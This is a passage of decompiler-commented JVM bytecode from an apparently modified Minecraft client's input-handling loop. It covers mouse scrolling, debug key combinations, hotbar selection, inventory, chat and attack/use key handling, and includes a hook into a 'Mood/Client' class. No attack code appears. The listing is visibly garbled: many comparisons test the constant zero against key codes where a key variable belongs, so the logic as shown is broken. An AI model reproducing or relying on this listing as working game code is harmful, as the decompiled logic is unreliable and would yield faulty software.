        //   489: invokevirtual   net/minecraft/entity/player/PlayerCapabilities.getFlySpeed:()F
        //   492: iload           6
        //   494: i2f            
        //   495: ldc_w           0.005
        //   498: fmul           
        //   499: fadd           
        //   500: fconst_0       
        //   501: ldc_w           0.2
        //   504: invokestatic    net/minecraft/util/MathHelper.clamp_float:(FFF)F
        //   507: fstore          7
        //   509: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //   512: getfield        net/minecraft/client/entity/EntityPlayerSP.capabilities:Lnet/minecraft/entity/player/PlayerCapabilities;
        //   515: fload           7
        //   517: invokevirtual   net/minecraft/entity/player/PlayerCapabilities.setFlySpeed:(F)V
        //   520: goto            534
        //   523: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //   526: getfield        net/minecraft/client/entity/EntityPlayerSP.inventory:Lnet/minecraft/entity/player/InventoryPlayer;
        //   529: iload           6
        //   531: invokevirtual   net/minecraft/entity/player/InventoryPlayer.changeCurrentItem:(I)V
        //   534: aload_0        
        //   535: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //   538: ifnonnull       561
        //   541: aload_0        
        //   542: getfield        net/minecraft/client/Minecraft.inGameHasFocus:Z
        //   545: ifne            575
        //   548: invokestatic    org/lwjgl/input/Mouse.getEventButtonState:()Z
        //   551: ifeq            575
        //   554: aload_0        
        //   555: invokevirtual   net/minecraft/client/Minecraft.setIngameFocus:()V
        //   558: goto            575
        //   561: aload_0        
        //   562: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //   565: ifnull          575
        //   568: aload_0        
        //   569: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //   572: invokevirtual   net/minecraft/client/gui/GuiScreen.handleMouseInput:()V
        //   575: invokestatic    org/lwjgl/input/Mouse.next:()Z
        //   578: ifne            357
        //   581: aload_0        
        //   582: getfield        net/minecraft/client/Minecraft.leftClickCounter:I
        //   585: ifle            598
        //   588: aload_0        
        //   589: dup            
        //   590: getfield        net/minecraft/client/Minecraft.leftClickCounter:I
        //   593: iconst_1       
        //   594: isub           
        //   595: putfield        net/minecraft/client/Minecraft.leftClickCounter:I
        //   598: aload_0        
        //   599: getfield        net/minecraft/client/Minecraft.mcProfiler:Lnet/minecraft/profiler/Profiler;
        //   602: ldc_w           "keyboard"
        //   605: invokevirtual   net/minecraft/profiler/Profiler.endStartSection:(Ljava/lang/String;)V
        //   608: goto            1395
        //   611: invokestatic    org/lwjgl/input/Keyboard.getEventKey:()I
        //   614: ifne            627
        //   617: invokestatic    org/lwjgl/input/Keyboard.getEventCharacter:()C
        //   620: sipush          256
        //   623: iadd           
        //   624: goto            630
        //   627: invokestatic    org/lwjgl/input/Keyboard.getEventKey:()I
        //   630: istore_3       
        //   631: iconst_0       
        //   632: invokestatic    org/lwjgl/input/Keyboard.getEventKeyState:()Z
        //   635: invokestatic    net/minecraft/client/settings/KeyBinding.setKeyBindState:(IZ)V
        //   638: invokestatic    org/lwjgl/input/Keyboard.getEventKeyState:()Z
        //   641: ifeq            648
        //   644: iconst_0       
        //   645: invokestatic    net/minecraft/client/settings/KeyBinding.onTick:(I)V
        //   648: aload_0        
        //   649: getfield        net/minecraft/client/Minecraft.debugCrashKeyPressTime:J
        //   652: lconst_0       
        //   653: lcmp           
        //   654: ifle            723
        //   657: invokestatic    net/minecraft/client/Minecraft.getSystemTime:()J
        //   660: aload_0        
        //   661: getfield        net/minecraft/client/Minecraft.debugCrashKeyPressTime:J
        //   664: lsub           
        //   665: ldc2_w          6000
        //   668: lcmp           
        //   669: iflt            697
        //   672: new             Lnet/minecraft/util/ReportedException;
        //   675: dup            
        //   676: new             Lnet/minecraft/crash/CrashReport;
        //   679: dup            
        //   680: ldc_w           "Manually triggered debug crash"
        //   683: new             Ljava/lang/Throwable;
        //   686: dup            
        //   687: invokespecial   java/lang/Throwable.<init>:()V
        //   690: invokespecial   net/minecraft/crash/CrashReport.<init>:(Ljava/lang/String;Ljava/lang/Throwable;)V
        //   693: invokespecial   net/minecraft/util/ReportedException.<init>:(Lnet/minecraft/crash/CrashReport;)V
        //   696: athrow         
        //   697: bipush          46
        //   699: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //   702: ifeq            713
        //   705: bipush          61
        //   707: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //   710: ifne            746
        //   713: aload_0        
        //   714: ldc2_w          -1
        //   717: putfield        net/minecraft/client/Minecraft.debugCrashKeyPressTime:J
        //   720: goto            746
        //   723: bipush          46
        //   725: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //   728: ifeq            746
        //   731: bipush          61
        //   733: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //   736: ifeq            746
        //   739: aload_0        
        //   740: invokestatic    net/minecraft/client/Minecraft.getSystemTime:()J
        //   743: putfield        net/minecraft/client/Minecraft.debugCrashKeyPressTime:J
        //   746: aload_0        
        //   747: invokevirtual   net/minecraft/client/Minecraft.dispatchKeypresses:()V
        //   750: invokestatic    org/lwjgl/input/Keyboard.getEventKeyState:()Z
        //   753: ifeq            1395
        //   756: iconst_0       
        //   757: bipush          62
        //   759: if_icmpne       776
        //   762: aload_0        
        //   763: getfield        net/minecraft/client/Minecraft.entityRenderer:Lnet/minecraft/client/renderer/EntityRenderer;
        //   766: ifnull          776
        //   769: aload_0        
        //   770: getfield        net/minecraft/client/Minecraft.entityRenderer:Lnet/minecraft/client/renderer/EntityRenderer;
        //   773: invokevirtual   net/minecraft/client/renderer/EntityRenderer.func_175071_c:()V
        //   776: aload_0        
        //   777: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //   780: ifnull          793
        //   783: aload_0        
        //   784: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //   787: invokevirtual   net/minecraft/client/gui/GuiScreen.handleKeyboardInput:()V
        //   790: goto            1342
        //   793: iconst_0       
        //   794: iconst_1       
        //   795: if_icmpne       802
        //   798: aload_0        
        //   799: invokevirtual   net/minecraft/client/Minecraft.displayInGameMenu:()V
        //   802: iconst_0       
        //   803: bipush          32
        //   805: if_icmpne       831
        //   808: bipush          61
        //   810: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //   813: ifeq            831
        //   816: getstatic       net/minecraft/client/Minecraft.ingameGUI:Lnet/minecraft/client/gui/GuiIngame;
        //   819: ifnull          831
        //   822: getstatic       net/minecraft/client/Minecraft.ingameGUI:Lnet/minecraft/client/gui/GuiIngame;
        //   825: invokevirtual   net/minecraft/client/gui/GuiIngame.getChatGUI:()Lnet/minecraft/client/gui/GuiNewChat;
        //   828: invokevirtual   net/minecraft/client/gui/GuiNewChat.clearChatMessages:()V
        //   831: iconst_0       
        //   832: invokestatic    Mood/Client.KeyPress:(I)V
        //   835: iconst_0       
        //   836: iconst_1       
        //   837: if_icmpne       844
        //   840: aload_0        
        //   841: invokevirtual   net/minecraft/client/Minecraft.displayInGameMenu:()V
        //   844: iconst_0       
        //   845: bipush          32
        //   847: if_icmpne       873
        //   850: bipush          61
        //   852: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //   855: ifeq            873
        //   858: getstatic       net/minecraft/client/Minecraft.ingameGUI:Lnet/minecraft/client/gui/GuiIngame;
        //   861: ifnull          873
        //   864: getstatic       net/minecraft/client/Minecraft.ingameGUI:Lnet/minecraft/client/gui/GuiIngame;
        //   867: invokevirtual   net/minecraft/client/gui/GuiIngame.getChatGUI:()Lnet/minecraft/client/gui/GuiNewChat;
        //   870: invokevirtual   net/minecraft/client/gui/GuiNewChat.clearChatMessages:()V
        //   873: iconst_0       
        //   874: bipush          31
        //   876: if_icmpne       891
        //   879: bipush          61
        //   881: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //   884: ifeq            891
        //   887: aload_0        
        //   888: invokevirtual   net/minecraft/client/Minecraft.refreshResources:()V
        //   891: iconst_0       
        //   892: bipush          17
        //   894: if_icmpne       902
        //   897: bipush          61
        //   899: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //   902: iconst_0       
        //   903: bipush          18
        //   905: if_icmpne       913
        //   908: bipush          61
        //   910: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //   913: iconst_0       
        //   914: bipush          47
        //   916: if_icmpne       924
        //   919: bipush          61
        //   921: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //   924: iconst_0       
        //   925: bipush          38
        //   927: if_icmpne       935
        //   930: bipush          61
        //   932: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //   935: iconst_0       
        //   936: bipush          22
        //   938: if_icmpne       946
        //   941: bipush          61
        //   943: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //   946: iconst_0       
        //   947: bipush          20
        //   949: if_icmpne       964
        //   952: bipush          61
        //   954: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //   957: ifeq            964
        //   960: aload_0        
        //   961: invokevirtual   net/minecraft/client/Minecraft.refreshResources:()V
        //   964: iconst_0       
        //   965: bipush          33
        //   967: if_icmpne       1010
        //   970: bipush          61
        //   972: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //   975: ifeq            1010
        //   978: bipush          42
        //   980: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //   983: bipush          54
        //   985: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //   988: ior            
        //   989: istore          4
        //   991: aload_0        
        //   992: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //   995: getstatic       net/minecraft/client/settings/GameSettings$Options.RENDER_DISTANCE:Lnet/minecraft/client/settings/GameSettings$Options;
        //   998: iconst_0       
        //   999: ifeq            1006
        //  1002: iconst_m1      
        //  1003: goto            1007
        //  1006: iconst_1       
        //  1007: invokevirtual   net/minecraft/client/settings/GameSettings.setOptionValue:(Lnet/minecraft/client/settings/GameSettings$Options;I)V
        //  1010: iconst_0       
        //  1011: bipush          30
        //  1013: if_icmpne       1031
        //  1016: bipush          61
        //  1018: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //  1021: ifeq            1031
        //  1024: aload_0        
        //  1025: getfield        net/minecraft/client/Minecraft.renderGlobal:Lnet/minecraft/client/renderer/RenderGlobal;
        //  1028: invokevirtual   net/minecraft/client/renderer/RenderGlobal.loadRenderers:()V
        //  1031: iconst_0       
        //  1032: bipush          35
        //  1034: if_icmpne       1074
        //  1037: bipush          61
        //  1039: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //  1042: ifeq            1074
        //  1045: aload_0        
        //  1046: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1049: aload_0        
        //  1050: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1053: getfield        net/minecraft/client/settings/GameSettings.advancedItemTooltips:Z
        //  1056: ifeq            1063
        //  1059: iconst_0       
        //  1060: goto            1064
        //  1063: iconst_1       
        //  1064: putfield        net/minecraft/client/settings/GameSettings.advancedItemTooltips:Z
        //  1067: aload_0        
        //  1068: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1071: invokevirtual   net/minecraft/client/settings/GameSettings.saveOptions:()V
        //  1074: iconst_0       
        //  1075: bipush          48
        //  1077: if_icmpne       1110
        //  1080: bipush          61
        //  1082: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //  1085: ifeq            1110
        //  1088: aload_0        
        //  1089: getfield        net/minecraft/client/Minecraft.renderManager:Lnet/minecraft/client/renderer/entity/RenderManager;
        //  1092: aload_0        
        //  1093: getfield        net/minecraft/client/Minecraft.renderManager:Lnet/minecraft/client/renderer/entity/RenderManager;
        //  1096: invokevirtual   net/minecraft/client/renderer/entity/RenderManager.func_178634_b:()Z
        //  1099: ifeq            1106
        //  1102: iconst_0       
        //  1103: goto            1107
        //  1106: iconst_1       
        //  1107: invokevirtual   net/minecraft/client/renderer/entity/RenderManager.func_178629_b:(Z)V
        //  1110: iconst_0       
        //  1111: bipush          25
        //  1113: if_icmpne       1153
        //  1116: bipush          61
        //  1118: invokestatic    org/lwjgl/input/Keyboard.isKeyDown:(I)Z
        //  1121: ifeq            1153
        //  1124: aload_0        
        //  1125: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1128: aload_0        
        //  1129: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1132: getfield        net/minecraft/client/settings/GameSettings.pauseOnLostFocus:Z
        //  1135: ifeq            1142
        //  1138: iconst_0       
        //  1139: goto            1143
        //  1142: iconst_1       
        //  1143: putfield        net/minecraft/client/settings/GameSettings.pauseOnLostFocus:Z
        //  1146: aload_0        
        //  1147: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1150: invokevirtual   net/minecraft/client/settings/GameSettings.saveOptions:()V
        //  1153: iconst_0       
        //  1154: bipush          59
        //  1156: if_icmpne       1181
        //  1159: aload_0        
        //  1160: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1163: aload_0        
        //  1164: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1167: getfield        net/minecraft/client/settings/GameSettings.hideGUI:Z
        //  1170: ifeq            1177
        //  1173: iconst_0       
        //  1174: goto            1178
        //  1177: iconst_1       
        //  1178: putfield        net/minecraft/client/settings/GameSettings.hideGUI:Z
        //  1181: iconst_0       
        //  1182: bipush          61
        //  1184: if_icmpne       1219
        //  1187: aload_0        
        //  1188: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1191: aload_0        
        //  1192: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1195: getfield        net/minecraft/client/settings/GameSettings.showDebugInfo:Z
        //  1198: ifeq            1205
        //  1201: iconst_0       
        //  1202: goto            1206
        //  1205: iconst_1       
        //  1206: putfield        net/minecraft/client/settings/GameSettings.showDebugInfo:Z
        //  1209: aload_0        
        //  1210: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1213: invokestatic    net/minecraft/client/gui/GuiScreen.isShiftKeyDown:()Z
        //  1216: putfield        net/minecraft/client/settings/GameSettings.showDebugProfilerChart:Z
        //  1219: aload_0        
        //  1220: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1223: getfield        net/minecraft/client/settings/GameSettings.keyBindTogglePerspective:Lnet/minecraft/client/settings/KeyBinding;
        //  1226: invokevirtual   net/minecraft/client/settings/KeyBinding.isPressed:()Z
        //  1229: ifeq            1307
        //  1232: aload_0        
        //  1233: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1236: dup            
        //  1237: getfield        net/minecraft/client/settings/GameSettings.thirdPersonView:I
        //  1240: iconst_1       
        //  1241: iadd           
        //  1242: putfield        net/minecraft/client/settings/GameSettings.thirdPersonView:I
        //  1245: aload_0        
        //  1246: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1249: getfield        net/minecraft/client/settings/GameSettings.thirdPersonView:I
        //  1252: iconst_2       
        //  1253: if_icmple       1264
        //  1256: aload_0        
        //  1257: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1260: iconst_0       
        //  1261: putfield        net/minecraft/client/settings/GameSettings.thirdPersonView:I
        //  1264: aload_0        
        //  1265: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1268: getfield        net/minecraft/client/settings/GameSettings.thirdPersonView:I
        //  1271: ifne            1288
        //  1274: aload_0        
        //  1275: getfield        net/minecraft/client/Minecraft.entityRenderer:Lnet/minecraft/client/renderer/EntityRenderer;
        //  1278: aload_0        
        //  1279: invokevirtual   net/minecraft/client/Minecraft.func_175606_aa:()Lnet/minecraft/entity/Entity;
        //  1282: invokevirtual   net/minecraft/client/renderer/EntityRenderer.func_175066_a:(Lnet/minecraft/entity/Entity;)V
        //  1285: goto            1307
        //  1288: aload_0        
        //  1289: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1292: getfield        net/minecraft/client/settings/GameSettings.thirdPersonView:I
        //  1295: iconst_1       
        //  1296: if_icmpne       1307
        //  1299: aload_0        
        //  1300: getfield        net/minecraft/client/Minecraft.entityRenderer:Lnet/minecraft/client/renderer/EntityRenderer;
        //  1303: aconst_null    
        //  1304: invokevirtual   net/minecraft/client/renderer/EntityRenderer.func_175066_a:(Lnet/minecraft/entity/Entity;)V
        //  1307: aload_0        
        //  1308: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1311: getfield        net/minecraft/client/settings/GameSettings.keyBindSmoothCamera:Lnet/minecraft/client/settings/KeyBinding;
        //  1314: invokevirtual   net/minecraft/client/settings/KeyBinding.isPressed:()Z
        //  1317: ifeq            1342
        //  1320: aload_0        
        //  1321: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1324: aload_0        
        //  1325: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1328: getfield        net/minecraft/client/settings/GameSettings.smoothCamera:Z
        //  1331: ifeq            1338
        //  1334: iconst_0       
        //  1335: goto            1339
        //  1338: iconst_1       
        //  1339: putfield        net/minecraft/client/settings/GameSettings.smoothCamera:Z
        //  1342: aload_0        
        //  1343: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1346: getfield        net/minecraft/client/settings/GameSettings.showDebugInfo:Z
        //  1349: ifeq            1395
        //  1352: aload_0        
        //  1353: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1356: getfield        net/minecraft/client/settings/GameSettings.showDebugProfilerChart:Z
        //  1359: ifeq            1395
        //  1362: iconst_0       
        //  1363: bipush          11
        //  1365: if_icmpne       1373
        //  1368: aload_0        
        //  1369: iconst_0       
        //  1370: invokespecial   net/minecraft/client/Minecraft.updateDebugProfilerName:(I)V
        //  1373: goto            1389
        //  1376: iconst_0       
        //  1377: iconst_2       
        //  1378: if_icmpne       1386
        //  1381: aload_0        
        //  1382: iconst_1       
        //  1383: invokespecial   net/minecraft/client/Minecraft.updateDebugProfilerName:(I)V
        //  1386: iinc            4, 1
        //  1389: iconst_0       
        //  1390: bipush          9
        //  1392: if_icmplt       1376
        //  1395: invokestatic    org/lwjgl/input/Keyboard.next:()Z
        //  1398: ifne            611
        //  1401: goto            1454
        //  1404: aload_0        
        //  1405: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1408: getfield        net/minecraft/client/settings/GameSettings.keyBindsHotbar:[Lnet/minecraft/client/settings/KeyBinding;
        //  1411: iconst_0       
        //  1412: aaload         
        //  1413: invokevirtual   net/minecraft/client/settings/KeyBinding.isPressed:()Z
        //  1416: ifeq            1451
        //  1419: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //  1422: invokevirtual   net/minecraft/client/entity/EntityPlayerSP.func_175149_v:()Z
        //  1425: ifeq            1441
        //  1428: getstatic       net/minecraft/client/Minecraft.ingameGUI:Lnet/minecraft/client/gui/GuiIngame;
        //  1431: invokevirtual   net/minecraft/client/gui/GuiIngame.func_175187_g:()Lnet/minecraft/client/gui/GuiSpectator;
        //  1434: iconst_0       
        //  1435: invokevirtual   net/minecraft/client/gui/GuiSpectator.func_175260_a:(I)V
        //  1438: goto            1451
        //  1441: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //  1444: getfield        net/minecraft/client/entity/EntityPlayerSP.inventory:Lnet/minecraft/entity/player/InventoryPlayer;
        //  1447: iconst_0       
        //  1448: putfield        net/minecraft/entity/player/InventoryPlayer.currentItem:I
        //  1451: iinc            3, 1
        //  1454: iconst_0       
        //  1455: bipush          9
        //  1457: if_icmplt       1404
        //  1460: getstatic       net/minecraft/client/settings/GameSettings.chatVisibility:Lnet/minecraft/entity/player/EntityPlayer$EnumChatVisibility;
        //  1463: getstatic       net/minecraft/entity/player/EntityPlayer$EnumChatVisibility.HIDDEN:Lnet/minecraft/entity/player/EntityPlayer$EnumChatVisibility;
        //  1466: if_acmpeq       1473
        //  1469: iconst_1       
        //  1470: goto            1474
        //  1473: iconst_0       
        //  1474: istore          4
        //  1476: goto            1528
        //  1479: getstatic       net/minecraft/client/Minecraft.playerController:Lnet/minecraft/client/multiplayer/PlayerControllerMP;
        //  1482: invokevirtual   net/minecraft/client/multiplayer/PlayerControllerMP.isRidingHorse:()Z
        //  1485: ifeq            1497
        //  1488: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //  1491: invokevirtual   net/minecraft/client/entity/EntityPlayerSP.func_175163_u:()V
        //  1494: goto            1528
        //  1497: aload_0        
        //  1498: invokevirtual   net/minecraft/client/Minecraft.getNetHandler:()Lnet/minecraft/client/network/NetHandlerPlayClient;
        //  1501: new             Lnet/minecraft/network/play/client/C16PacketClientStatus;
        //  1504: dup            
        //  1505: getstatic       net/minecraft/network/play/client/C16PacketClientStatus$EnumState.OPEN_INVENTORY_ACHIEVEMENT:Lnet/minecraft/network/play/client/C16PacketClientStatus$EnumState;
        //  1508: invokespecial   net/minecraft/network/play/client/C16PacketClientStatus.<init>:(Lnet/minecraft/network/play/client/C16PacketClientStatus$EnumState;)V
        //  1511: invokevirtual   net/minecraft/client/network/NetHandlerPlayClient.addToSendQueue:(Lnet/minecraft/network/Packet;)V
        //  1514: aload_0        
        //  1515: new             Lnet/minecraft/client/gui/inventory/GuiInventory;
        //  1518: dup            
        //  1519: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //  1522: invokespecial   net/minecraft/client/gui/inventory/GuiInventory.<init>:(Lnet/minecraft/entity/player/EntityPlayer;)V
        //  1525: invokevirtual   net/minecraft/client/Minecraft.displayGuiScreen:(Lnet/minecraft/client/gui/GuiScreen;)V
        //  1528: aload_0        
        //  1529: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1532: getfield        net/minecraft/client/settings/GameSettings.keyBindInventory:Lnet/minecraft/client/settings/KeyBinding;
        //  1535: invokevirtual   net/minecraft/client/settings/KeyBinding.isPressed:()Z
        //  1538: ifne            1479
        //  1541: goto            1563
        //  1544: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //  1547: invokevirtual   net/minecraft/client/entity/EntityPlayerSP.func_175149_v:()Z
        //  1550: ifne            1563
        //  1553: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //  1556: invokestatic    net/minecraft/client/gui/GuiScreen.isCtrlKeyDown:()Z
        //  1559: invokevirtual   net/minecraft/client/entity/EntityPlayerSP.dropOneItem:(Z)Lnet/minecraft/entity/item/EntityItem;
        //  1562: pop            
        //  1563: aload_0        
        //  1564: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1567: getfield        net/minecraft/client/settings/GameSettings.keyBindDrop:Lnet/minecraft/client/settings/KeyBinding;
        //  1570: invokevirtual   net/minecraft/client/settings/KeyBinding.isPressed:()Z
        //  1573: ifne            1544
        //  1576: goto            1590
        //  1579: aload_0        
        //  1580: new             Lnet/minecraft/client/gui/GuiChat;
        //  1583: dup            
        //  1584: invokespecial   net/minecraft/client/gui/GuiChat.<init>:()V
        //  1587: invokevirtual   net/minecraft/client/Minecraft.displayGuiScreen:(Lnet/minecraft/client/gui/GuiScreen;)V
        //  1590: aload_0        
        //  1591: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1594: getfield        net/minecraft/client/settings/GameSettings.keyBindChat:Lnet/minecraft/client/settings/KeyBinding;
        //  1597: invokevirtual   net/minecraft/client/settings/KeyBinding.isPressed:()Z
        //  1600: ifeq            1607
        //  1603: iconst_0       
        //  1604: ifne            1579
        //  1607: aload_0        
        //  1608: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //  1611: ifnonnull       1645
        //  1614: aload_0        
        //  1615: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1618: getfield        net/minecraft/client/settings/GameSettings.keyBindCommand:Lnet/minecraft/client/settings/KeyBinding;
        //  1621: invokevirtual   net/minecraft/client/settings/KeyBinding.isPressed:()Z
        //  1624: ifeq            1645
        //  1627: iconst_0       
        //  1628: ifeq            1645
        //  1631: aload_0        
        //  1632: new             Lnet/minecraft/client/gui/GuiChat;
        //  1635: dup            
        //  1636: ldc_w           "/"
        //  1639: invokespecial   net/minecraft/client/gui/GuiChat.<init>:(Ljava/lang/String;)V
        //  1642: invokevirtual   net/minecraft/client/Minecraft.displayGuiScreen:(Lnet/minecraft/client/gui/GuiScreen;)V
        //  1645: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //  1648: invokevirtual   net/minecraft/client/entity/EntityPlayerSP.isUsingItem:()Z
        //  1651: ifeq            1722
        //  1654: aload_0        
        //  1655: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1658: getfield        net/minecraft/client/settings/GameSettings.keyBindUseItem:Lnet/minecraft/client/settings/KeyBinding;
        //  1661: invokevirtual   net/minecraft/client/settings/KeyBinding.getIsKeyPressed:()Z
        //  1664: ifne            1676
        //  1667: getstatic       net/minecraft/client/Minecraft.playerController:Lnet/minecraft/client/multiplayer/PlayerControllerMP;
        //  1670: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //  1673: invokevirtual   net/minecraft/client/multiplayer/PlayerControllerMP.onStoppedUsingItem:(Lnet/minecraft/entity/player/EntityPlayer;)V
        //  1676: aload_0        
        //  1677: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1680: getfield        net/minecraft/client/settings/GameSettings.keyBindAttack:Lnet/minecraft/client/settings/KeyBinding;
        //  1683: invokevirtual   net/minecraft/client/settings/KeyBinding.isPressed:()Z
        //  1686: ifne            1676
        //  1689: aload_0        
        //  1690: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1693: getfield        net/minecraft/client/settings/GameSettings.keyBindUseItem:Lnet/minecraft/client/settings/KeyBinding;
        //  1696: invokevirtual   net/minecraft/client/settings/KeyBinding.isPressed:()Z
        //  1699: ifne            1689
        //  1702: aload_0        
        //  1703: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1706: getfield        net/minecraft/client/settings/GameSettings.keyBindPickBlock:Lnet/minecraft/client/settings/KeyBinding;
        //  1709: invokevirtual   net/minecraft/client/settings/KeyBinding.isPressed:()Z
        //  1712: ifeq            1775
        //  1715: goto            1702
        //  1718: aload_0        
        //  1719: invokevirtual   net/minecraft/client/Minecraft.clickMouse:()V
        //  1722: aload_0        
        //  1723: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1726: getfield        net/minecraft/client/settings/GameSettings.keyBindAttack:Lnet/minecraft/client/settings/KeyBinding;
        //  1729: invokevirtual   net/minecraft/client/settings/KeyBinding.isPressed:()Z
        //  1732: ifne            1718
        //  1735: goto            1742
        //  1738: aload_0        
        //  1739: invokevirtual   net/minecraft/client/Minecraft.rightClickMouse:()V
        //  1742: aload_0        
        //  1743: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1746: getfield        net/minecraft/client/settings/GameSettings.keyBindUseItem:Lnet/minecraft/client/settings/KeyBinding;
        //  1749: invokevirtual   net/minecraft/client/settings/KeyBinding.isPressed:()Z
        //  1752: ifne            1738
        //  1755: goto            1762
        //  1758: aload_0        
        //  1759: invokespecial   net/minecraft/client/Minecraft.middleClickMouse:()V
        //  1762: aload_0        
        //  1763: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1766: getfield        net/minecraft/client/settings/GameSettings.keyBindPickBlock:Lnet/minecraft/client/settings/KeyBinding;
        //  1769: invokevirtual   net/minecraft/client/settings/KeyBinding.isPressed:()Z
        //  1772: ifne            1758
        //  1775: aload_0        
        //  1776: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1779: getfield        net/minecraft/client/settings/GameSettings.keyBindUseItem:Lnet/minecraft/client/settings/KeyBinding;
        //  1782: invokevirtual   net/minecraft/client/settings/KeyBinding.getIsKeyPressed:()Z
        //  1785: ifeq            1807
